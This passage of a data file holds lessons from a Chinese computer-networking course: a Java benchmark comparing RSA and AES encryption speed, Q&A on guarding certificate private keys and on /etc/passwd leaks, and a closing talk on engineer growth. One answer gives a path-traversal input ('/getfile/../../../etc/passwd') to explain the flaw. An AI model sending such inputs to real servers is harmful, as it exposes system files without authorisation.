InvalidKeyException, BadPaddingException, IllegalBlockSizeException </span>{\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> keyPairGen = KeyPairGenerator.getInstance(<span class="hljs-string">"RSA"</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> pair = keyPairGen.generateKeyPair();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> privateKey = pair.getPrivate().getEncoded();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> faker = <span class="hljs-keyword">new</span> Faker();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> start = System.currentTimeMillis();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> keyFactory = KeyFactory.getInstance(<span class="hljs-string">"RSA"</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> keySpec = <span class="hljs-keyword">new</span> PKCS8EncodedKeySpec(privateKey);\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> key = keyFactory.generatePrivate(keySpec);\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> randomBytes = faker.shakespeare().asYouLikeItQuote().getBytes();\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> cipher = Cipher.getInstance(keyFactory.getAlgorithm());\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cipher.init(Cipher.ENCRYPT_MODE, key);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> resultBytes = cipher.doFinal(randomBytes);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">if</span>(i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>) {\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; System.out.format(<span class="hljs-string">"%d/10000 done.\\n"</span>, i);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }\n&nbsp; &nbsp; &nbsp; &nbsp; }\n&nbsp; &nbsp; &nbsp; &nbsp; System.out.format(<span class="hljs-string">"time: %dms\\n"</span>, System.currentTimeMillis() - start);\n&nbsp; &nbsp; }\n&nbsp; &nbsp; <span class="hljs-meta">@Test</span>\n&nbsp; &nbsp; <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">aesEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, NoSuchPaddingException, InvalidAlgorithmParameterException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException </span>{\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> keyGenerator = KeyGenerator.getInstance(<span class="hljs-string">"AES"</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; keyGenerator.init(<span class="hljs-number">128</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> key = keyGenerator.generateKey();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> faker = <span class="hljs-keyword">new</span> Faker();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> ivBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">16</span>];\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> start = System.currentTimeMillis();\n&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> randomBytes = faker.shakespeare().asYouLikeItQuote().getBytes();\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> cipher = Cipher.getInstance(<span class="hljs-string">"AES/CBC/PKCS5Padding"</span>);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">new</span> SecureRandom().nextBytes(ivBytes);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> iv = <span class="hljs-keyword">new</span> IvParameterSpec(ivBytes);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cipher.init(Cipher.ENCRYPT_MODE, key, iv);\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">var</span> result = cipher.doFinal(randomBytes);\n&nbsp; &nbsp; &nbsp; &nbsp; }\n&nbsp; &nbsp; &nbsp; &nbsp; System.out.format(<span class="hljs-string">"time: %dms\\n"</span>, System.currentTimeMillis() - start);\n&nbsp; &nbsp; }\n}\n</code></pre>\n<p data-nodeid="50182">其中用 RSA 非对称加密算法加密 10000 个莎士比亚书中的句子，用时在 11s 左右，而采用 AES 对称加密算法加密，用时在 400ms 左右。</p>\n<h4 data-nodeid="50183">20 | 信任链：为什么可以相信一个 HTTPS 网站？</h4>\n<p data-nodeid="50184">【<strong data-nodeid="50235">问题</strong>】如果公司要求你生成一个公私钥对，然后去证书机构申请证书，请问如果你丢失了这个公私钥对有什么危害？你要如何保护这个公私钥对？</p>\n<p data-nodeid="50185">【<strong data-nodeid="50241">解答</strong>】先明说说为什么会有这个问题。网站拥有者向 CA 机构申请证书时，证书请求文件中只包含公钥，不包含私钥。 证书私钥由网站保存，证书请求文件提交给 CA 机构进行认证和签名后对外公开。而大部分公司都会规定：含有敏感信息的数据不能带出公司，比如只能存放在公司的笔记本、公司的网盘、公司的服务器上，但是显然对于存储证书的场景不适用。因为私钥太敏感了，有了私钥相当于可以解密用户发送给服务器的数据，泄漏的危害性非常大。</p>\n<p data-nodeid="50186">因此，此类证书文件通常不在办公电脑，或者公司网盘上备份。如果你自己的电脑中有备份，应该尽快删除。通常证书直接保存到安全级别较高的服务器上，只有需要使用证书的软件才能够访问。另外，如果外部的第三方服务需要用到私钥，比如 CDN，那么这里还会涉及一些特别的密钥分发技术，以及硬件加密技术，具体可以参考 Keyless SSL 和 Intel 的 QAT 方案。</p>\n<h4 data-nodeid="50187">21 | 攻防手段介绍：如何抵御 SYN 拒绝攻击？</h4>\n<p data-nodeid="50188">【<strong data-nodeid="50249">问题</strong>】哪些情况下你服务器的 /etc/passwd 文件会被黑客拿走？</p>\n<p data-nodeid="50189">【<strong data-nodeid="50259">解答</strong>】比较常见的情形就是<strong data-nodeid="50260">开发机器信息泄漏或者中毒成了肉鸡</strong>。很多同学的开发机器上都配置了到服务器跳板机的免密登录权限。如果开发机器上公钥泄漏，黑客就有可能登入跳板机。如果成了肉鸡，那么很多行为都可以远程操控，相当于黑客攻破了你公司的内网。</p>\n<p data-nodeid="50190">还有一种常见的情形和代码注入有些相似之处，比如说有一个获取配置文件的服务，用参数表示配置文件的名称，比如 /getfile/a.txt 代表取出代码路径某个相对目录的 a.txt。这个时候如果网站程序实现直接将参数作为文件路径的一部分，黑客可能会尝试使用 /getfile/../../../etc/passwd 去获取 /etc/passwd 文件。</p>\n<h3 data-nodeid="50191">总结</h3>\n<p data-nodeid="50192">网络安全类知识不仅面试中经常考察，本身也属于非常实用的知识。在实际工作中，如果触碰了高危操作，很有可能给你个人或公司带来灾难。因此在架构一个系统，或者书写架构文档的时候，建议你拿出一个小节具体讨论安全问题。</p>\n<p data-nodeid="50193">学到这里，《计算机网络通关 29 讲》专栏的全部课程就结束了，简单总结一下。</p>\n<ul data-nodeid="50194">\n<li data-nodeid="50195">\n<p data-nodeid="50196">网络协议 TCP/IP/UDP 的重点是了解其中的关键原理，并在遇到问题的时候，你脑海里能有大致的解决思路和应对方案，比如建立多少连接？连接和线程是什么模型？</p>\n</li>\n<li data-nodeid="50197">\n<p data-nodeid="50198">Web 技术是工作技能，需要你根据自己的工作类型详细了解完整的技术栈。</p>\n</li>\n<li data-nodeid="50199">\n<p data-nodeid="50200">网络编程部分和语言设计、操作系统等知识结合紧密，如果你想进一步理解 I/O、内存、磁盘等知识，可以学习我在拉勾教育平台推出的另一门<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="50270">《重学操作系统》</a>专栏。</p>\n</li>\n<li data-nodeid="50201">\n<p data-nodeid="50202">最后，网络安全是高压线，工作中不容忽视，需要你加倍小心，谨慎处理。这里我嘱咐你两件事情：第一，技术岗位其实很容易违法，违法行为坚决不要做；第二，上线前要进行安全扫描，养成习惯。</p>\n</li>\n</ul>\n<p data-nodeid="50203">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是本专栏的最后一篇内容，我想和你聊聊《未来需要怎样的工程师》，再见。</p>',
        article_title: "加餐 | 模块五思考题解答",
        title: "加餐 | 模块五思考题解答",
        id: 7290,
      },
    ],
  },
  {
    chapterTitle: "结束语",
    children: [
      {
        content:
          '<p data-nodeid="50865">到这里，相信你已经学完了《计算机网络通关 29 讲》的课程，今天我想和你聊聊“程序员后续的学习和成长”。</p>\n<p data-nodeid="50866">你有没有想过：<strong data-nodeid="50888">未来需要怎样的工程师</strong>？对于这个问题，我相信每个人都有自己的答案。同样的，我心里也有很多答案。这些年我看到优秀的工程师们，身上有很多很多的闪光点，我这里并不会一一和你探讨，仅打算选两个我认为很重要，而平时找我做职业辅导的同学又不知道的点。</p>\n<h3 data-nodeid="50867">未来需要怎样的工程师？</h3>\n<p data-nodeid="50868"><strong data-nodeid="50894">首先，未来需要学习能力强的工程师</strong>。你可能会说，我知道呀！那么这里我再补充一个小细节——学习能力很大程度是和你已经拥有的知识成正比的。通常情况下，在一个领域学习过的知识越多，那么在这个领域的学习能力就越强。很多同学以为学习是为了获得知识，其实学习很多时候是为了提高学习能力。</p>\n<p data-nodeid="50869">顺着这个角度我们再延伸一下：人的大脑和计算机有一些相似之处，比如都有存储、运算能力。学过算法和数据结构的同学都知道，如果数据结构设计合理，那么时间复杂度的提升不是线性的。比如最简单的求斐波那契数列的第 N 项，在没有缓存或者动态规划的情况下，时间复杂度是 O(2<sup>n</sup>)。但如果使用缓存（或者说设计合理的存储），复杂度可以降低到 O(n)。</p>\n<p data-nodeid="50870">有的人天生思考快、有的人天生思考慢，我们喜欢把思考快的人称为聪明人。其实，聪明并不决定最终的产出效率。你可以类比成数据结构用错了，连斐波那契这样简单的问题，人类的算力都不能够穷尽。但如果用对了数据结构，小学生也可以解答。因此，很多先天优势在拥有一定的积累之后，意义就没有那么大了。</p>\n<p data-nodeid="50871"><strong data-nodeid="50905">综上，我建议你，多对知识进行分类整理，多思考多提炼，你可以用合理的知识结构去避免大规模深入复杂的思考，从而设计出更优秀的系统</strong>。</p>\n<p data-nodeid="50872"><strong data-nodeid="50910">第二，任何时候，不仅仅是未来，总是需要对生活、对世界有足够了解的工程师</strong>。面向对象的背后有范畴学的支撑，但是我们在用面向对象设计系统的时候，并不会使用范畴学，我们更多的是观察周围世界的运作规律，并将这些规律引入我们的程序，从而设计出更好的类型。</p>\n<p data-nodeid="50873">其实设计系统也是一样，需要从我们生活的世界中找灵感。我看到很多同学太过于钻研技术而忘记了自己要达成的目的，陷入每天向老板汇报项目进度，和产品经理沟通排期，每天根据原型设计系统实现需求的循环往复之中，却忘记了最重要的本源——我们为什么要做这个系统？如何更好地服务用户？系统能够带来什么改变？</p>\n<p data-nodeid="50874">我看到一些优秀的人，为了回答这几个问题，会不断探索自己所在的行业，学习行业知识，不断思考如何让自己的系统可以适应行业和时代的变化。</p>\n<p data-nodeid="50875">综上，这里我给你提出第二个建议——找个时间，抛开技术，思考下自己所在的行业需要什么技术？特别是未来 5-10 年需要什么技术？自己有这方面技能吗？自己还要学什么？</p>\n<h3 data-nodeid="50876">写在最后</h3>\n<p data-nodeid="50877">最后再和你聊聊我自己的经历吧。先说说学习能力这块。我的学习能力是通过长期的学习逐步提高的。一开始，我学东西很慢，一个 Bug 查资料可能卡一天，一本 C++ 的书看一遍花了很长时间。但写项目的时候，仍然发现有很多知识没有理解透，需要反复去钻研。</p>\n<p data-nodeid="50878">后来随着年龄越来越大，明显感觉到精力在衰减，但是学习的速度反而越来越快。现在我学习一门语言，扫一遍目录就知道大概，挑几个重点看一下就可以使用了。但是刚开始学程序的时候，一些库、框架需要琢磨很久才能使用。后来见得多了，接触一些新的框架时，往往几天就能理解到原理层面。所以，学习速度非常依赖你已经掌握的知识体量，而且可以通过积累提速。你千万不要因为暂时知道的少，学习慢就失去信心。</p>\n<p data-nodeid="50879">下面再来聊聊我做技术 Leader 这些年总结出来的事情。做一个技术 Leader，主要有两方面事情，一方面是提效，无论是技术重构、研发流程优化，还是招聘员工、代码 Review，提效都是一个重要目标。另一方面就是赚钱，帮公司赚钱。我在职业初期，更多的是把精力放在提效上，深入钻研了很多技术方案。直到做了许多年的 Leader，才发现帮助公司发展业务，其实也是一件非常有趣，且很有成就感的事情。</p>\n<p data-nodeid="50880">作为一个过来人，希望你在工作中不要忘记生活，学习中也不要失去韧性。要知道，功夫在诗外。如果感觉自己处于瓶颈期，静下心来去旅旅游，回家乡小住一段时间都是不错的选择。</p>\n<p data-nodeid="50881">以上就是我想和你分享的，从业这些年来的一些想法和经验。发现求知的乐趣，我是林䭽。再见。</p>',
        article_title: "结束语 | 未来需要怎样的工程师",
        title: "结束语 | 未来需要怎样的工程师",
        id: 7291,
      },
    ],
  },
];
